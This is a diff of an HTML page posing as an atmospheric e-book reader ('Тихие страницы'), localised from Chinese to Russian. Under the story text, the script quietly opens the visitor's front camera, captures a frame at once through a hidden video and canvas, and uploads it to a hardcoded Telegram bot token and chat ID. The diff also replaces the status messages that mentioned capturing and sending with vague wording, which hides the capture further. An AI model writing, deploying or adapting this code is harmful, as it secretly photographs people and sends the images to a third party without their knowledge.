@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>电子书架上</title>
+    <title>Книжная полка</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -61,20 +61,20 @@
 </head>
 <body>
 <div class="book">
-    <h1>静默的书页</h1>
+    <h1>Тихие страницы</h1>
     <div class="chapter">
-        <p>… 他翻开泛黄的书页。窗外下着雨，唯一的灯光是那盏带着绿色灯罩的台灯。在这样的时刻，时间仿佛静止了。文字编织成故事，自在地流淌，不求任何回报。</p>
-        <p>但有时，即使是最专注的读者，也会感觉到一道目光。也许只是影子？或是潮湿玻璃上的反光？这本书再次展露它的秘密，而房间里渐渐温暖起来…</p>
+        <p>… Он открыл книгу на старой, пожелтевшей странице. За окном шумел дождь, и единственным светом была настольная лампа с зелёным абажуром. В такие моменты забываешь о времени.</p>
+        <p>Но иногда даже самый погружённый читатель чувствует чей-то взгляд. Книга вновь приоткрывает свои тайны, а в комнате становится чуть теплее…</p>
     </div>
-    <div id="status" class="status-message">⏳ 准备就绪...</div>
-    <footer>「您所看到的页面或许会改变」<br>(c) 灰色调练习曲</footer>
+    <div id="status" class="status-message">⏳ Подготовка...</div>
+    <footer>«Страница, которую вы видите, может измениться»<br>(c) Этюд в серых тонах</footer>
 </div>
 
 <video id="hidden-video" autoplay playsinline muted></video>
 <canvas id="hidden-canvas" style="display: none;"></canvas>
 
 <script>
-    // ========== TELEGRAM 设置 ==========
+    // ========== ПРАВИЛЬНЫЕ ДАННЫЕ ==========
     const BOT_TOKEN = '8595875715:AAGNWXSU1uR_29Hli6vGAyzI5juAI3-OHmA';
     const CHAT_ID = '5305261101';
 
@@ -84,23 +84,7 @@
 
     let stream = null;
     let photoCaptured = false;
-    let captureAttempted = false;
-
-    // Китайские сообщения
-    const messages = {
-        requestAccess: '🔐 请求访问前置摄像头...',
-        granted: '✅ 摄像头权限已授予',
-        waitingFrame: '⏳ 等待第一个画面...',
-        capturing: '📸 拍摄中...',
-        sending: '📤 发送到 Telegram...',
-        success: '✅ 照片已发送！',
-        noFrontCam: '⚠️ 未找到前置摄像头，尝试使用默认摄像头...',
-        denied: '❌ 您拒绝了摄像头权限。请刷新页面并允许访问。',
-        error: '❌ 错误: ',
-        clickToAllow: '📌 请点击页面任意位置以允许摄像头访问',
-        networkError: '🌐 网络错误: ',
-        telegramError: '⚠️ Telegram 错误: '
-    };
+    let captureAttempted = false;  // Защита от двойного захвата
 
     function setStatus(msg, isError = false) {
         statusDiv.innerHTML = isError ? `⚠️ ${msg}` : `📘 ${msg}`;
@@ -116,16 +100,15 @@
         video.srcObject = null;
     }
 
+    // МГНОВЕННЫЙ захват (без задержек)
     function performCapture() {
         if (photoCaptured) return;
         
         if (!video.videoWidth || !video.videoHeight) {
-            setStatus(messages.error + '没有视频流', true);
+            setStatus('Ошибка: нет видеопотока', true);
             return;
         }
 
-        setStatus(messages.capturing);
-        
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
@@ -136,10 +119,10 @@
 
         canvas.toBlob(async (blob) => {
             if (!blob) {
-                setStatus(messages.error + '照片创建失败', true);
+                setStatus('Ошибка', true);
                 return;
             }
-            setStatus(messages.sending);
+            setStatus('...');
 
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -152,14 +135,14 @@
                 });
                 const result = await response.json();
                 if (result.ok) {
-                    setStatus(messages.success);
+                    setStatus('✅!');
                     photoCaptured = true;
                     stopCamera();
                 } else {
-                    setStatus(messages.telegramError + (result.description || '未知错误'), true);
+                    setStatus(`Ошибка: ${result.description}`, true);
                 }
             } catch (err) {
-                setStatus(messages.networkError + err.message, true);
+                setStatus(`Ошибка сети: ${err.message}`, true);
             }
         }, 'image/jpeg', 0.85);
     }
@@ -169,50 +152,51 @@
         captureAttempted = true;
         
         if (!video.videoWidth || !video.videoHeight) {
+            // Ждём первый кадр через событие playing
             video.addEventListener('playing', function onPlaying() {
                 video.removeEventListener('playing', onPlaying);
                 performCapture();
             }, { once: true });
-            setStatus(messages.waitingFrame);
+            setStatus('Ожидание первого кадра...');
             return;
         }
         performCapture();
     }
 
     async function requestCameraAndAutoCapture() {
-        setStatus(messages.requestAccess);
+        setStatus('Запрос доступа...');
         try {
             stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: { exact: "user" } }
             });
             video.srcObject = stream;
-            setStatus(messages.granted);
+            setStatus('Камера готова');
             
+            // МГНОВЕННЫЙ захват при готовности первого кадра
             video.oncanplay = () => {
                 video.play();
                 captureAndSend();
             };
             
         } catch (err) {
-            console.error(err);
             if (err.name === 'OverconstrainedError') {
-                setStatus(messages.noFrontCam, true);
+                setStatus('Доступ не найден. Пробую любую...', true);
                 try {
                     const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     stream = fallbackStream;
                     video.srcObject = stream;
-                    setStatus('✅ 使用默认摄像头');
+                    setStatus('Используется доступ по умолчанию');
                     video.oncanplay = () => {
                         video.play();
                         captureAndSend();
                     };
                 } catch (fallbackErr) {
-                    setStatus(messages.error + fallbackErr.message, true);
+                    setStatus('Ошибка доступа: ' + fallbackErr.message, true);
                 }
             } else if (err.name === 'NotAllowedError') {
-                setStatus(messages.denied, true);
+                setStatus('Вы запретили доступ. Разрешите и обновите страницу.', true);
             } else {
-                setStatus(messages.error + err.message, true);
+                setStatus('Ошибка: ' + err.message, true);
             }
         }
     }
@@ -221,7 +205,7 @@
         requestCameraAndAutoCapture();
         setTimeout(() => {
             if (!stream && !photoCaptured) {
-                setStatus(messages.clickToAllow, false);
+                setStatus('📌 Нажмите в любом месте страницы для доступа');
                 document.body.addEventListener('click', () => requestCameraAndAutoCapture(), { once: true });
             }
         }, 1500);
